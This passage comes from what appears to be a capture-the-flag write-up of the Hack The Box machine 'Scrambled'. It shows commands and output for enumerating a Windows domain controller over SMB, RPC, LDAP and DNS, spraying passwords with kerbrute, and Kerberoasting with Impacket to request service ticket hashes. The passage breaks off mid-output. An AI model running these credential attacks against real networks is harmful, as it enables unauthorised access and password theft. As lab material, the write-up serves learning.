<span id="cb3-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> WORKGROUP<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\v</span>oid password: </span>
<span id="cb3-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">session</span> setup failed: NT_STATUS_NOT_SUPPORTED</span>
<span id="cb3-17"></span>
<span id="cb3-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled smbclient <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-U</span> ksimpson <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-L</span> 10.10.11.168</span>
<span id="cb3-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enter</span> WORKGROUP<span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\k</span>simpsons password: </span>
<span id="cb3-20"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">session</span> setup failed: NT_STATUS_NOT_SUPPORTED</span>
<span id="cb3-21"></span>
<span id="cb3-22"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled smbmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> 10.10.11.168</span>
<span id="cb3-23"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[!]</span> Authentication error on 10.10.11.168</span>
<span id="cb3-24"></span>
<span id="cb3-25"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled smbmap <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> 10.10.11.168</span>
<span id="cb3-26"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[!]</span> Authentication error on 10.10.11.168</span>
<span id="cb3-27"></span>
<span id="cb3-28"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled crackmapexec smb 10.10.11.168 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-u</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-p</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--shares</span></span>
<span id="cb3-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SMB</span>         10.10.11.168    445    NONE             <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">*</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>  x64 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">name:</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">domain:</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">signing:True</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SMBv1:False</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb3-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SMB</span>         10.10.11.168    445    NONE             <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[-]</span> <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\:</span> STATUS_NOT_SUPPORTED </span>
<span id="cb3-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">SMB</span>         10.10.11.168    445    NONE             <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[-]</span> Error enumerating shares: SMB SessionError: STATUS_USER_SESSION_DELETED<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">The</span> remote user session has been deleted.<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
<p><strong>port 135:</strong></p>
<div class="sourceCode" id="cb4" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb4-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-rpcdump 10.10.11.168 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> rpcdump.out</span>
<span id="cb4-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled cat rpcdump.out<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="fu" style="color: #4758AB;
background-color: null;
font-style: inherit;">grep</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-i</span> pipe        </span>
<span id="cb4-3">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\PIPE\InitShutdown]</span></span>
<span id="cb4-4">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\PIPE\InitShutdown]</span></span>
<span id="cb4-5">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\lsass]</span></span>
<span id="cb4-6">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\eventlog]</span></span>
<span id="cb4-7">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\26bddf8e29d9b793]</span></span>
<span id="cb4-8">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\lsass]</span></span>
<span id="cb4-9">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\26bddf8e29d9b793]</span></span>
<span id="cb4-10">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\lsass]</span></span>
<span id="cb4-11">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\26bddf8e29d9b793]</span></span>
<span id="cb4-12">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\lsass]</span></span>
<span id="cb4-13">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\26bddf8e29d9b793]</span></span>
<span id="cb4-14">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\lsass]</span></span>
<span id="cb4-15">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\26bddf8e29d9b793]</span></span>
<span id="cb4-16">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\lsass]</span></span>
<span id="cb4-17">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\lsass]</span></span>
<span id="cb4-18">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\lsass]</span></span>
<span id="cb4-19">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\lsass]</span></span>
<span id="cb4-20">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\lsass]</span></span>
<span id="cb4-21">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\PIPE\atsvc]</span></span>
<span id="cb4-22">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\PIPE\atsvc]</span></span>
<span id="cb4-23">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\PIPE\atsvc]</span></span>
<span id="cb4-24">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\PIPE\atsvc]</span></span>
<span id="cb4-25">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\PIPE\atsvc]</span></span>
<span id="cb4-26">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\PIPE\wkssvc]</span></span>
<span id="cb4-27">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\tapsrv]</span></span>
<span id="cb4-28">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\PIPE\ROUTER]</span></span>
<span id="cb4-29">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\pipe\cert]</span></span></code></pre></div>
<p>Reading on <a href="https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc">HackTricks</a> <code>\pipe\atsvc</code> is listed as <em>Notable RPC interfaces</em> with the description <em>“Task scheduler, used to remotely execute commands”</em>. Verifying with the IFID value we can confirm that the Task Scheduler is exposed:</p>
<div class="sourceCode" id="cb5" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb5-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled grep <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-ia2</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1ff70682-0a51-30e8-076d-740be8cee98b"</span> rpcdump.out</span>
<span id="cb5-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Protocol:</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">MS</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">-</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">TSCH</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span>: Task Scheduler Service Remoting Protocol </span>
<span id="cb5-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Provider:</span> taskcomp.dll </span>
<span id="cb5-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UUID</span>    : 1FF70682-0A51-30E8-076D-740BE8CEE98B v1.0 </span>
<span id="cb5-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Bindings:</span> </span>
<span id="cb5-6">          <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ncacn_np:\\DC1[\PIPE\atsvc]</span></span></code></pre></div>
<p>Trying to continue down this road I get stuck and I’m unable to bind using <code>NCACN_IP_TCP</code>, lets move on.</p>
<div class="sourceCode" id="cb6" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb6-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-rpcmap <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'ncacn_ip_tcp:10.10.11.168'</span>    </span>
<span id="cb6-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb6-3"></span>
<span id="cb6-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> Protocol failed: Bind context rejected: invalid_checksum</span></code></pre></div>
<p><strong>port 389/636/3268/3269:</strong></p>
<div class="sourceCode" id="cb7" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb7-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled ldapsearch <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-x</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> ldap://10.10.11.168 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-D</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-w</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">''</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-b</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"DC=scrm,DC=local"</span></span>
<span id="cb7-2"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># extended LDIF</span></span>
<span id="cb7-3"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#</span></span>
<span id="cb7-4"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># LDAPv3</span></span>
<span id="cb7-5"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># base &lt;DC=scrm,DC=local&gt; with scope subtree</span></span>
<span id="cb7-6"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># filter: (objectclass=*)</span></span>
<span id="cb7-7"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># requesting: ALL</span></span>
<span id="cb7-8"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#</span></span>
<span id="cb7-9"></span>
<span id="cb7-10"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># search result</span></span>
<span id="cb7-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">search:</span> 2</span>
<span id="cb7-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">result:</span> 1 Operations error</span>
<span id="cb7-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">text:</span> 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera</span>
<span id="cb7-14"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tion</span> a successful bind must be completed on the connection., data 0, v4563</span>
<span id="cb7-15"></span>
<span id="cb7-16"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># numResponses: 1</span></span>
<span id="cb7-17"></span>
<span id="cb7-18"></span>
<span id="cb7-19"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled ldapsearch <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-H</span> ldap://10.10.11.168 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-x</span></span>
<span id="cb7-20"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># extended LDIF</span></span>
<span id="cb7-21"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#</span></span>
<span id="cb7-22"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># LDAPv3</span></span>
<span id="cb7-23"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># base &lt;&gt; (default) with scope subtree</span></span>
<span id="cb7-24"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># filter: (objectclass=*)</span></span>
<span id="cb7-25"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># requesting: ALL</span></span>
<span id="cb7-26"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">#</span></span>
<span id="cb7-27"></span>
<span id="cb7-28"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># search result</span></span>
<span id="cb7-29"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">search:</span> 2</span>
<span id="cb7-30"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">result:</span> 1 Operations error</span>
<span id="cb7-31"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">text:</span> 000004DC: LdapErr: DSID-0C090A5C, comment: In order to perform this opera</span>
<span id="cb7-32"> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">tion</span> a successful bind must be completed on the connection., data 0, v4563</span>
<span id="cb7-33"></span>
<span id="cb7-34"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;"># numResponses: 1</span></span></code></pre></div>
<p><strong>port 9389:</strong></p>
<div class="sourceCode" id="cb8" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb8-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled nc 10.10.11.168 9389                </span>
<span id="cb8-2"><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">help</span></span></code></pre></div>
<p><strong>port 53:</strong></p>
<div class="sourceCode" id="cb9" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb9-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled host <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-t</span> axfr scrm.local 10.10.11.168      </span>
<span id="cb9-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Trying</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"scrm.local"</span></span>
<span id="cb9-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Using</span> domain server:</span>
<span id="cb9-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Name:</span> 10.10.11.168</span>
<span id="cb9-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Address:</span> 10.10.11.168#53</span>
<span id="cb9-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Aliases:</span> </span>
<span id="cb9-7"></span>
<span id="cb9-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Host</span> scrm.local not found: 5<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">REFUSED</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb9-9"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Transfer</span> failed.</span>
<span id="cb9-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled dig axfr scrm.local @10.10.11.168</span>
<span id="cb9-11"></span>
<span id="cb9-12"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;&lt;&gt;&gt;</span> DiG <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9.18.1-1-Debian</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;&lt;&gt;&gt;</span> axfr scrm.local @10.10.11.168</span>
<span id="cb9-13"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">global</span> options: +cmd</span>
<span id="cb9-14"><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Transfer</span> failed.</span></code></pre></div>
</section>
<section id="step-2---kerberoast" class="level3">
<h3 class="anchored" data-anchor-id="step-2---kerberoast">Step 2 - Kerberoast</h3>
<p>With all the “normal” enumeration coming up short, I decide to dig deeper into the hints from the webpage especially username and password being the same. We have the user <code>ksimpson</code>, lets try if his password is set to be the same.</p>
<div class="sourceCode" id="cb10" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb10-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  /opt ./kerbrute_linux_amd64 passwordspray <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-d</span> scrm.local <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--dc</span> 10.10.11.168 /home/void/htb/scrambled/users.txt ksimpson </span>
<span id="cb10-2"></span>
<span id="cb10-3">    <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">__</span>             __               __     </span>
<span id="cb10-4">   <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/</span> /_____  _____/ /_  _______  __/ /____ </span>
<span id="cb10-5">  <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/</span> //_/ _ <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\/</span> ___/ __ <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\/</span> ___/ / / / __/ _ <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\</span></span>
<span id="cb10-6"> / ,<span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&lt;</span> /  __/ /  / /_/ / /  / /_/ / /_/  __/</span>
<span id="cb10-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/_/</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">_</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">\___/_/</span>  /_.___/_/   <span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\_</span>_,_/\__/\___/                                        </span>
<span id="cb10-8"></span>
<span id="cb10-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Version:</span> v1.0.3 <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">9dad6e1</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">-</span> 09/15/22 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Ronnie Flathers @ropnop</span>
<span id="cb10-10"></span>
<span id="cb10-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/09/15</span> 11:21:19 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>  Using KDC<span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">s</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span></span>
<span id="cb10-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/09/15</span> 11:21:19 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>   10.10.11.168:88</span>
<span id="cb10-13"></span>
<span id="cb10-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">2022/09/15</span> 11:21:19 <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>  <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">+</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> VALID LOGIN:  ksimpson@scrm.local:ksimpson</span></code></pre></div>
<p>Testing Kerberoast fails:</p>
<div class="sourceCode" id="cb11" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb11-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-GetUserSPNs scrm.local/ksimpson:ksimpson <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-dc-ip</span> 10.10.11.168</span>
<span id="cb11-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb11-3"></span>
<span id="cb11-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Unpacked data doesn't match constant value 'b''' should be ''NTLMSSP</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">\\</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">x00''"</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'When unpacking field \'</span> <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">|</span> <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"NTLMSSP\x00 | b\'\'[:8]\'')</span></span></code></pre></div>
<p>Testing ASREPRoast fails:</p>
<div class="sourceCode" id="cb12" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb12-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-GetNPUsers scrm.local/ <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-usersfile</span> users.txt <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-format</span> hashcat </span>
<span id="cb12-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb12-3"></span>
<span id="cb12-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> User administrator doesn<span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">'t have UF_DONT_REQUIRE_PREAUTH set</span></span>
<span id="cb12-5"><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">[-] User ksimpson doesn'</span>t have UF_DONT_REQUIRE_PREAUTH set</span></code></pre></div>
<p>Testing the credentials over SMB, WinRM and LDAP all fails as well.. I was stuck at this point for a while. Reviewing the enumerated data it finally clicked, all NTML authentication has been disabled. Instead lets try to generate a TGT and use that to authenticate instead.</p>
<div class="sourceCode" id="cb13" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb13-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-getTGT scrm.local/ksimpson:ksimpson <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-dc-ip</span> 10.10.11.168</span>
<span id="cb13-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb13-3"></span>
<span id="cb13-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[*]</span> Saving ticket in ksimpson.ccache</span></code></pre></div>
<p>Export the ticket and lets try to Kerberoast again:</p>
<div class="sourceCode" id="cb14" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb14-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled export KRB5CCNAME=ksimpson.ccache</span>
<span id="cb14-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled impacket-GetUserSPNs scrm.local/ksimpson <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-no-pass</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-request</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-dc-ip</span> 10.10.11.168</span>
<span id="cb14-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb14-4"></span>
<span id="cb14-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[-]</span> exceptions must derive from BaseException</span></code></pre></div>
<p>I’ve never seen this error before. Researching about it I find this <a href="https://github.com/SecureAuthCorp/impacket/issues/1206">git issue</a> made by the box creator, VbScrub, explaining the issue. This has since been patched and they’ve added the flag <code>-dc-host</code> to mitigate the issue. Download the fresh script and run with <code>-dc-host</code> flag:</p>
<div class="sourceCode" id="cb15" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb15-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled wget https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/examples/GetUserSPNs.py</span>
<span id="cb15-2"></span>
<span id="cb15-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  scrambled python GetUserSPNs.py scrm.local/ksimpson <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-k</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-no-pass</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-dc-ip</span> 10.10.11.168 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-dc-host</span> dc1.scrm.local <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-request</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-outputfile</span> krb.hash</span>
<span id="cb15-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Impacket</span> v0.10.0 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> Copyright 2022 SecureAuth Corporation</span>
<span id="cb15-5"></span>
<span id="cb15-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">ServicePrincipalName</span>          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation </span>
<span id="cb15-7"><span class="ex" style="color: null;
background-color: null;
